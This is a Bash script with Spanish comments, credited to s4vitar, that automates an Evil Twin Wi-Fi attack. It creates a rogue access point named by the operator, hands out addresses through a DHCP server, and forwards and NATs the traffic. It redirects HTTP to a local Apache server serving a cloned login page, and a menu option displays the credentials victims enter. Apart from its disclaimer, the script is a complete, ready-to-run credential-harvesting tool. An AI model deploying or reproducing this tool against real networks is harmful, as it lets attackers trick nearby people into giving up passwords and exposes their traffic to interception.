#!/bin/bash
# Programa hecho por Marcelo Vázquez (aka s4vitar)
# No me hago responsable del mal uso que se pueda hacer de este programa, pues pretende ser educativo, no malicioso.

#Colours
greenColour="\e[0;32m\033[1m"
endColour="\033[0m\e[0m"
redColour="\e[0;31m\033[1m"
blueColour="\e[0;34m\033[1m"
yellowColour="\e[0;33m\033[1m"
purpleColour="\e[0;35m\033[1m"
turquoiseColour="\e[0;36m\033[1m"
grayColour="\e[0;37m\033[1m"


xxx(){
	q=1
} && trap 'xxx' SIGINT

attack()
{
	clear && sleep 1 && echo -e "${yellowColour}Creando fichero de configuración dhcp...${endColour}" && sleep 1

	echo "authoritative;" > /etc/dhcpd.conf
	echo "default-lease-time 600;" >> /etc/dhcpd.conf
	echo "max-lease-time 7200;" >> /etc/dhcpd.conf
	echo "subnet 192.168.1.128 netmask 255.255.255.128 {" >> /etc/dhcpd.conf
	echo "option subnet-mask 255.255.255.128;" >> /etc/dhcpd.conf
	echo "option broadcast-address 192.168.1.255;" >> /etc/dhcpd.conf
	echo "option routers 192.168.1.129;" >> /etc/dhcpd.conf
	echo "option domain-name-servers 8.8.8.8;" >> /etc/dhcpd.conf
	echo "range 192.168.1.130 192.168.1.140;" >> /etc/dhcpd.conf
	echo "}" >> /etc/dhcpd.conf

	sleep 1 && echo -e "\n${yellowColour}Habilitando enrutamiento en el equipo...${endColour}" && sleep 1

	echo 1 > /proc/sys/net/ipv4/ip_forward

	sleep 1 && echo -ne "\n${yellowColour}Interfaz a poner en modo monitor [$endColour${blueColour}$(ifconfig | cut -d ' ' -f 1 | xargs | tr -d ':' | tr ' ' ',')${endColour}$yellowColour]:${endColour} " && tput cnorm
	read interface && tput civis

	echo -e "\n${yellowColour}Configurando${endColour}${blueColour} $interface$endColour${yellowColour} en modo monitor...${endColour}" && sleep 1

	airmon-ng start $interface > /dev/null 2>&1

	sleep 1 && echo -e "\n${yellowColour}Limpiando reglas iptables...${endColour}" && sleep 1

	iptables --flush && iptables --table nat --flush
	iptables --delete-chain && iptables --table nat --delete-chain

	sleep 1 && echo -ne "\n${yellowColour}Nombre del punto de acceso:${endColour} " && tput cnorm
	read apName
	sleep 1 && echo -ne "\n${yellowColour}Canal a operar: ${endColour}"
	read channel && tput civis

	sleep 1 && echo -e "\n${yellowColour}Preparando AP... ${endColour}" && sleep 1

	tmux new-session -d -s EvilTwin && tmux rename-window 'Attack'
	tmux split-window -h && tmux select-pane -t 0
	tmux send-keys "airbase-ng -e '$apName' -c $channel -P ${interface}mon" C-m && sleep 5
	tmux select-pane -t 1
	tmux send-keys "ifconfig at0 192.168.1.129 netmask 255.255.255.128" C-m && sleep 0.5
	tmux send-keys "route add -net 192.168.1.128 netmask 255.255.255.128 gw 192.168.1.129" C-m && sleep 0.5
	tmux send-keys "iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE" C-m && sleep 0.5
	tmux send-keys "iptables --append FORWARD --in-interface at0 -j ACCEPT" C-m && sleep 0.5
	tmux send-keys "iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination $(hostname -I | awk '{print $1}'):80" C-m && sleep 0.5
	tmux send-keys "iptables -t nat -A POSTROUTING -j MASQUERADE" C-m && sleep 0.5

	tmux new-window -t EvilTwin:1 -n 'dhcp'
	tmux send-keys "dhcpd -cf /etc/dhcpd.conf -pf /var/run/dhcpd.pid at0" C-m && sleep 0.5

	sleep 1 && echo -e "\n${yellowColour}Evil Twin gestionándose a través de sesión tmux:\n ${endColour}" && tmux list-sessions
	sleep 1 && echo -e "\n${yellowColour}Iniciando servicios... ${endColour}" && sleep 1

	service apache2 start && rm -r /var/www/html/* 2>/dev/null && sleep 1
	cp Plantilla/* /var/www/html 2>/dev/null && tput cnorm
	chmod o+w -R /var/www/html
}

cleaner()
{
	echo 0 > /proc/sys/net/ipv4/ip_forward

	iptables --flush && iptables --table nat --flush && iptables --delete-chain && iptables --table nat --delete-chain

	rm -r /etc/dhcpd.conf 2>/dev/null
	rm -r /var/run/dhcpd.pid 2>/dev/null

	if [ "$interface" ]; then
		airmon-ng stop ${interface}mon > /dev/null 2>&1
	fi

	ifconfig at0 down 2>/dev/null
	service network-manager restart && service apache2 stop && rm -rf /var/www/html/* 2>/dev/null && tmux kill-session -t EvilTwin 2>/dev/null
}

credentialsMonitor()
{
	while true; do clear && echo -e "${yellowColour}Monitorizando credenciales introducidas [$endColour${blueColour}Refresco de 5 segundos${endColour}${yellowColour}]: \n${endColour}"
		if [ -f /var/www/html/AP_Harvester.txt ]; then
			cat /var/www/html/AP_Harvester.txt
		fi && sleep 5

		if [ "$q" == "1" ]; then
			break
		fi
	done
}

installation()
{
	if [ ! "$(which xdotool)" ]; then
		clear && echo -e "${yellowColour}El programa${endColour}${blueColour} xdotool${endColour}${yellowColour} no se encuentra instalado\n" && sleep 0.5
		echo -ne "${yellowColour}¿Deseas instalar el programa? (s/n) ${endColour}" && tput cnorm
		read xdotool_installation

		if [ "$xdotool_installation" == "s" ]; then
			echo -e "\n${blueColour}Instalando...${endColour}\n"
			apt-get install -y xdotool > /dev/null 2>&1 && echo -e "${redColour}¡Programa Instalado!${endColour}" && sleep 2
		fi
	fi

	if [ ! "$(which aircrack-ng)" ]; then
		clear && echo -e "${yellowColour}El programa${endColour}${blueColour} aircrack-ng${endColour}${yellowColour} no se encuentra instalado\n" && sleep 0.5
		echo -ne "${yellowColour}¿Deseas instalar el programa? (s/n) ${endColour}" && tput cnorm
		read aircrack_installation

		if [ "$aircrack_installation" == "s" ]; then
			echo -e "\n${blueColour}Instalando...${endColour}\n"
			apt-get install -y aircrack-ng > /dev/null 2>&1 && echo -e "${redColour}¡Programa Instalado!${endColour}" && sleep 2
		fi
	fi

	if [ ! "$(which tmux)" ]; then
		clear && echo -e "${yellowColour}El programa${endColour}${blueColour} tmux${endColour}${yellowColour} no se encuentra instalado\n" && sleep 0.5
		echo -ne "${yellowColour}¿Deseas instalar el programa? (s/n) ${endColour}" && tput cnorm
		read tmux_installation

		if [ "$tmux_installation" == "s" ]; then
			echo -e "\n${blueColour}Instalando...${endColour}\n"
			apt-get install -y tmux > /dev/null 2>&1 && echo -e "${redColour}¡Programa Instalado!${endColour}" && sleep 2
		fi
	fi
}

menu()
{
	q=0

	echo -e "$yellowColour╱╭╮╱╱╱╱╱╱╱╱╭╮╭━╮╭━╮" && sleep 0.06
	echo -e "╭╯╰╮╱╱╱╱╱╱╭╯╰┫┃╰╯┃┃" && sleep 0.06
	echo -e "╰╮╭╋━┳╮╭┳━┻╮╭┫╭╮╭╮┣━━╮" && sleep 0.06
	echo -e "╱┃┃┃╭┫┃┃┃━━┫┃┃┃┃┃┃┃┃━┫ $endColoue${grayColour}Hecho por Marcelo Vázquez (${endColour}${blueColour}aka s4vitar${endColour}${grayColour})${endColour}$yellowColour" && sleep 0.06
	echo -e "╱┃╰┫┃┃╰╯┣━━┃╰┫┃┃┃┃┃┃━┫" && sleep 0.06
	echo -e "╱╰━┻╯╰━━┻━━┻━┻╯╰╯╰┻━━╯$endColour" && sleep 0.06
	echo -e "$redColour-----------------------$endColour" & sleep 1
	echo -e "${blueColour}1) ${endColour}${grayColour}Iniciar ataque${endColour}" && sleep 0.06
	echo -e "${blueColour}2) ${endColour}${grayColour}Reiniciar configuración${endColour}" && sleep 0.06
	echo -e "${blueColour}3) ${endColour}${grayColour}Instalación de programas necesarios${endColour}" && sleep 0.06
	echo -e "${blueColour}4) ${endColour}${grayColour}Monitorización de Credenciales Introducidas${endColour}" && sleep 0.06
	echo -e "${blueColour}0) ${endColour}${grayColour}Salir del programa${endColour}" && sleep 0.06
	echo -e "$redColour----------------------------------------------$endColour" & sleep 1
	echo -ne "${yellowColour}Selecciona una opción:${endColour} " && tput cnorm
	read option && tput civis
}

if [ "$(id -u)" -eq "0" ]; then

	clear && tput civis && echo -e "${grayColour}El programa está disponible en GitHub ($endColour${blueColour}https://github.com/s4vitar/TrustMe${endColour}${grayColour}), recomiendo su lectura para el correcto entendimiento del programa.${endColour}" && sleep 6

	while true; do

		clear && tput civis && sleep 2

		menu

		case $option in

			1) attack
				;;

			2) cleaner
				;;

			3) installation
				;;

			4) credentialsMonitor
				;;

			0) tput cnorm && exit
				;;

		esac
	done
else
	echo -e "${redColour}Es necesario correr el programa como root${endColour}"
fi
